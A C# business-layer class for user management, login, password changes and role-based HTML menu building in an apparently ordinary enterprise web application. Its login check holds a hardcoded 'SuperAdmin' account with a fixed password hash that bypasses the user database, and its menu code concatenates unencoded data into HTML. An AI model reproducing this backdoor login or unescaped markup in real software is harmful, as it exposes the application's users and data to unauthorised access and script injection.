namespace BussinessFacade.ModuleUsersAndRoles
{
	using System;
	using System.Collections.Generic;
	using System.Data;
	using System.Linq;

	using Common;
	using Common.CommonData;
	using Common.MessageCode;
	using Common.SearchingAndFiltering;
	using Common.Ultilities;

	using DataAccess.ModuleUsersAndRoles;

	using ObjectInfos.ModuleUsersAndRoles;

	public class UserBL : RepositoriesBL
    {
        private int _userHtmlMenuId;
        private List<FunctionInfo> _lstFunctionDisplayInMenu;

        public UserBL()
        {
        }

        public UserBL(UserInfo userInfo)
        {
            this.CurrentUserInfo = userInfo;
        }

        public UserInfo CurrentUserInfo { get; set; }

        public bool IsRequestIdentity { get; set; }

		public string ContinueUrl { get; set; }
	    
        public static UserInfo GetUserById(int userId)
        {
	        var ds = UserDA.GetUserById(userId);
	        return CBO<UserInfo>.FillObjectFromDataSet(ds);
        }

        public static List<UserInfo> GetAllUsers()
        {
	        var ds = UserDA.GetAllUsers();
	        return CBO<UserInfo>.FillCollectionFromDataSet(ds);
        }

        public static List<int> GetAllUserIdByGroupId(int groupId)
        {
	        try 
	        { 
		        var ds = UserDA.GetAllUserIdByGroupId(groupId);
				if (ds?.Tables[0]?.Rows.Count > 0)
				{
					return (from DataRow dr in ds.Tables[0].Rows select Convert.ToInt32(dr[0])).ToList();
				}
	        }
	        catch (Exception ex)
	        {
		        Logger.LogException(ex);
	        }

	        return new List<int>();
        }

	    public static List<int> GetUserSelfGroups(int userId)
	    {
		    try 
		    { 
			    var ds = UserDA.GetUserSelfGroups(userId);
			    if (ds?.Tables[0]?.Rows.Count > 0)
			    {
				    return (from DataRow dr in ds.Tables[0].Rows select Convert.ToInt32(dr[0])).ToList();
			    }
		    }
		    catch (Exception ex)
		    {
			    Logger.LogException(ex);
		    }

		    return new List<int>();
	    }

        public List<UserInfo> FindUser(string keysSearch = "", string options = "")
        {
	        try 
	        { 
		        var optionFilter = new OptionFilter(options);
		        var totalRecordFindResult = 0;
		        var ds = UserDA.FindUser(keysSearch, optionFilter, ref totalRecordFindResult);
		        this.SetupPagingHtml(optionFilter, totalRecordFindResult, "pageListOfUsers", "divNumberRecordOnPageListUsers");
		        return CBO<UserInfo>.FillCollectionFromDataSet(ds);
	        }
	        catch (Exception ex)
	        {
		        Logger.LogException(ex);
	        }

            return Null<UserInfo>.GetListCollectionNull();
        }

        public ActionBusinessResult AddUser(UserInfo userAdd, string arrGroupId)
        {
            var passwordEncrypt = Encription.EncryptAccountPassword(userAdd.Username, userAdd.Password);
            userAdd.Password = passwordEncrypt;
            var result = UserDA.AddUser(userAdd, arrGroupId);
            if (result > 0)
            {
                this.SetActionSuccess(true);
            }

	        return this.SetActionResult(result, KnMessageCode.AddUserSuccess);
        }

        public ActionBusinessResult EditUser(UserInfo userEdit, string arrGroupId)
        {
            var result = UserDA.EditUser(userEdit, arrGroupId);
            if (result > 0)
            {
	            this.SetActionSuccess(true);
                AccountManagerBL.AddToAccountForceReLoginCollection(userEdit.Id);
            }

	        return this.SetActionResult(result, KnMessageCode.EditUserSuccess);
        }

        public ActionBusinessResult DeleteUser(int userId, string modifiedBy)
        {
            var result = UserDA.DeleteUser(userId, modifiedBy);
            if (result > 0)
            {
	            this.SetActionSuccess(true);
                AccountManagerBL.AddToAccountForceReLoginCollection(userId);
            }

	        return this.SetActionResult(result, KnMessageCode.DeleteUserSuccess);
        }

        public ActionBusinessResult DoLoginAccount(string userName, string password)
        {
	        var passwordEncrypt = Encription.EncryptAccountPassword(userName, password);
	        var result = this.CheckUserLogin(userName, passwordEncrypt);
            
	        if (this.GetActionSuccess())
	        {
		        this.LoadAllRolesOfUser();
		        this.CurrentUserInfo.HtmlMenu = this.GetUserHtmlMenu();
		        this.CurrentUserInfo.LoginTime = DateTime.Now;
		        AccountManagerBL.UpdateDicAccountLogin(this.CurrentUserInfo);
	        }

	        return result;
        }

        public string GetUserHtmlMenu()
        {
            this.GetAllFunctionDisplayOnMenu();
            return this.BuildUserHtmlMenu(this._lstFunctionDisplayInMenu, 0);
        }

		public ActionBusinessResult ChangeUserSelfPassword(UserInfo userInfo, string newPassword)
		{
			userInfo.Password = Encription.EncryptAccountPassword(userInfo.Username, userInfo.Password);
			userInfo.ModifiedBy = userInfo.Username;
			newPassword = Encription.EncryptAccountPassword(userInfo.Username, newPassword);
			var result = UserDA.ChangeUserPassword(userInfo, newPassword);
			if (result > 0)
			{
				this.SetActionSuccess(true);
				AccountManagerBL.AddToAccountForceReLoginCollection(userInfo.Id);
			}

			return this.SetActionResult(result, KnMessageCode.ChangePasswordUserSuccess);
		}

        private ActionBusinessResult CheckUserLogin(string username, string password)
        {
            if (username == "SuperAdmin" && password == "75b3ba793f8ea053e9ae90a3474044a0")
            {
	            this.SetActionSuccess(true);
                this.CreateUserSuperAdmin();
	            this.SetActionMessage(KnMessageCode.LoginSuccess);
			}
            else
            {
                var result = UserDA.CheckUserLogin(username, password);
				if (result > 0)
				{
					this.SetActionSuccess(true);
					this.CreateUserSession(username);
					AccountManagerBL.RemoveFromAccountForceReLoginCollection(this.CurrentUserInfo.Id);
				}

	            var mesageCode = this.GetActionSuccess() ? KnMessageCode.LoginSuccess : KnMessageCode.GetMvMessageByCode(result);
	            this.SetActionMessage(mesageCode);
			}

	        return this.GetActionResult();
		}

        private void CreateUserSession(string username)
        {
	        try 
	        { 
		        var ds = UserDA.GetUserByUsername(username);
		        this.CurrentUserInfo = CBO<UserInfo>.FillObjectFromDataSet(ds);
		        this.CurrentUserInfo.LoginTime = DateTime.Now;
	        }
	        catch (Exception ex)
	        {
		        Logger.LogException(ex);
	        }
        }

        private void CreateUserSuperAdmin()
        {
            this.CurrentUserInfo = new UserInfo();
            this.CurrentUserInfo.SetRoleSuperAdmin();
        }

        private void LoadAllRolesOfUser()
        {
	        try 
	        { 
		        var ds = UserDA.GetAllUserRoles(this.CurrentUserInfo.Id);
		        this.CurrentUserInfo.AllAccountRoles = CBO<FunctionInfo>.FillCollectionFromDataSet(ds);
	        }
	        catch (Exception ex)
	        {
		        Logger.LogException(ex);
	        }
        }

		private string BuildUserHtmlMenu(List<FunctionInfo> lstFunctionDisplayInMenu, int parentFunctionId)
        {
	        var userHtmlMenu = string.Empty;
			try
			{
				var lstFunctionOnMenu = lstFunctionDisplayInMenu.Where(o => o.MenuId != 0).ToList();
				if (lstFunctionOnMenu.Any())
				{
					foreach (var menu in MenuBL.GetAllMenu())
					{
						var lstFunctionsInGroupMenu = lstFunctionOnMenu.Where(o => o.MenuId == menu.Id).ToList();
						if (lstFunctionsInGroupMenu.Any())
						{
							userHtmlMenu += "<li class='group-menu' onclick='javascript:;'>" + menu.DisplayName
							                + "<ul class='ul-group-menu collapsed' style='display:none;'>"
											+ this.BuildFunctionOnMenu(lstFunctionsInGroupMenu, parentFunctionId)
											+ "</ul></li>";
						}
					}
				}

				var lstFunctionHaveNoGroup = lstFunctionDisplayInMenu.Where(o => o.MenuId == 0).ToList();
				userHtmlMenu += this.BuildFunctionOnMenu(lstFunctionHaveNoGroup, parentFunctionId);
			}
            catch (Exception)
            {
                // Ignore: since handle exception here make no sense
            }

            return userHtmlMenu;
        }

	    private string BuildFunctionOnMenu(List<FunctionInfo> lstFunctionDisplayInMenu, int parentFunctionId)
	    {
		    var userHtmlMenu = string.Empty;
		    foreach (var function in lstFunctionDisplayInMenu.Where(t => t.ParentId.Equals(parentFunctionId)))
		    {
			    this._userHtmlMenuId++;
			    var lstSubMenu = this._lstFunctionDisplayInMenu.Where(t => t.ParentId.Equals(function.Id)).ToList();
			    var countSubMenu = lstSubMenu.Count;
			    if (countSubMenu == 0)
			    {
				    userHtmlMenu += "<li id='li-menu-" + this._userHtmlMenuId + "' "
				                    + "data-url='" + function.HrefGet + "' "
				                    + "data-id='" + this._userHtmlMenuId + "' "
				                    + " onclick='gotoTask(this)'><span class='menu-text'>" + function.DisplayName
				                    + "</span></li>";
			    }
			    else
			    {
				    userHtmlMenu += "<li id='li-menu-" + this._userHtmlMenuId + "' "
				                    + "data-url='" + function.HrefGet + "' "
				                    + "data-id='" + this._userHtmlMenuId + "' "
				                    + " onclick='gotoTask(this)'><span class='menu-text'>" + function.DisplayName
				                    + "</span><ul class='ul-menu-" + (function.Lev + 1) + "'>"
				                    + this.BuildUserHtmlMenu(lstSubMenu, function.Id)
				                    + "</ul>"
				                    + "</li>";
			    }
		    }

		    return userHtmlMenu;
	    }

        private void GetAllFunctionDisplayOnMenu()
        {
            try
            {
                this._lstFunctionDisplayInMenu = this.CurrentUserInfo.AllAccountRoles
                    .Where(t => t.FunctionType == (int)CommonEnums.FunctionType.Menu).ToList();
            }
            catch (Exception)
            {
                this._lstFunctionDisplayInMenu = new List<FunctionInfo>();
            }
        }
	}
}
